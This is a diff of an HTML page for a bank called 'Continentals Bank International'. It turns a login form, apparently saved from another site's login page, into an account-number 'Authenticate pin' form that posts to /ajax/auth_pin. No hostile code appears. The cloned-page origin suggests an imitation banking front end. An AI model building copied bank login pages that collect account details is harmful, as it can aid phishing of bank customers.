@@ -1,6 +1,5 @@
 <!DOCTYPE html>
-<!-- saved from url=(0036)https://westalliantfin.com/login.php -->
-<html lang="zxx" class="js" style="height: 100%;">
+    <html lang="zxx" class="js" style="height: 100%;">
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <meta name="author" content="Continentals Bank International">
@@ -13,7 +12,6 @@
         <!-- StyleSheets  -->
         <link rel="stylesheet" href="./Login_files/dashlite.css">
         <link id="skin-default" rel="stylesheet" href="./Login_files/theme.css">
-        <link type="text/css" rel="stylesheet" charset="UTF-8" href="./Login_files/translateelement.css"><script type="text/javascript" charset="UTF-8" src="./Login_files/m=el_main"></script>
         <link rel="stylesheet" href="./override_global.css">
         <link rel="stylesheet" href="./Login_files/overwrite.css">
         <script src="https://kit.fontawesome.com/16810e6ebd.js" crossorigin="anonymous"></script>
@@ -28,65 +26,35 @@
                 <!-- content @s -->
                 <div class="nk-content ">
                     <div class="nk-block nk-block-middle nk-auth-body  wide-xs">
-                        <div class="brand-logo pb-4 text-center">
-                            <a class="logo-link">
-                                <div id="logo">
-                                    <img class="mb-logo" src="./Home_files/assets/CSB.PNG" alt="the logo" style="width: 4rem; height: 2rem; border-radius: 10px;">
-                                </div>
-                            </a>
-                        </div>
                         <div class="card card-bordered">
                             <div class="card-inner card-inner-lg">
                                 <div class="nk-block-head">
                                     <div class="nk-block-head-content">
-                                        <h4 class="nk-block-title" style = "color: var(--my-teal-dark);">Sign-In</h4>
+                                        <h4 class="nk-block-title" style = "color: var(--my-teal-dark);">Authentication</h4>
                                         <div class="nk-block-des">
                                             <p>Access your banking account using your account number and password.</p>
                                         </div>
                                     </div>
                                 </div>
-                                <form method="POST" action="/ajax/login">
+                                <form method="POST" action="/ajax/auth_pin">
                                     <div id="response" class = "response" style="display:none"></div>
                                     <div class="form-group">
                                         <div class="form-label-group">
-                                            <label class="form-label" for="acct" style = "color: var(--my-teal-dark);">Account Number</label>
+                                            <label class="form-label" for="acct" style = "color: var(--my-teal-dark);">Authenticate account</label>
                                         </div>
-                                        <input id="account_no" type="number" autofocus="" class="form-control form-control-lg" name="acc_no" placeholder="Enter your account number" required>
+                                        <input id="account_no" type="number" autofocus="" class="form-control form-control-lg" name="acc_no" placeholder="Authenticate this account" required>
                                     </div>
-                                    <input type="hidden" name="code" value="" class="form-group" required>
-                                    <div class="form-label-group">
-                                        <label class="form-label" for="pass" style = "color: var(--my-teal-dark);">Password</label>
-                                        <a class="link link-primary link-sm" href="./reset">Forgot Password?</a>
-                                    </div>
-                                    <div class="form-control-wrap">
-                                        <a href="./Login.html" class="form-icon form-icon-right passcode-switch" data-target="password">
-                                            <em class="passcode-icon icon-show icon ni ni-eye"></em>
-                                            <em class="passcode-icon icon-hide icon ni ni-eye-off"></em>
-                                        </a>
-                                    
-                                        <input id="password" type="password" autofocus="" class="form-control form-control-lg" name="upass" placeholder="Enter your password" required>
-                                    </div>
+
                                     <div class="form-group">
-                                        <button id="login" class="btn btn-lg btn-primary btn-block" name="login" type="submit">Sign in</button>
-        
-                                        <button class="btn btn-lg btn-primary btn-block" style="display:none" id="authHide" disabled="">
-                                            <div class="spinner-border spinner-border-sm" role="status">
-                                                <span class="sr-only">Loading...</span>
-                                            </div>
-                                            <div class="spinner-grow spinner-grow-sm" role="status">
-                                                <span class="sr-only">Loading...</span>
-                                            </div>
-                                                Authenticating Account
-                                        </button>
+                                        <button id="login" class="btn btn-lg btn-primary btn-block" name="login" type="submit">Authenticate pin</button>
                                     </div>
                                 </form>
                             </div>
-
-                            <div class="form-note-s2 text-center pt-4"> New Customer? <a href="./application.html">Create an account</a>
                         </div>
                     </div>
                 </div>
             </div>
+
         <div class="nk-footer nk-auth-footer-full">
             <div class="container wide-lg">
                 <div class="row g-3">
@@ -135,7 +103,6 @@
             </div>
             <!-- content @e -->
     </div>
-    <!-- <script src="./endpoint.login.js"></script> -->
     <div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./Login_files/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
 
 
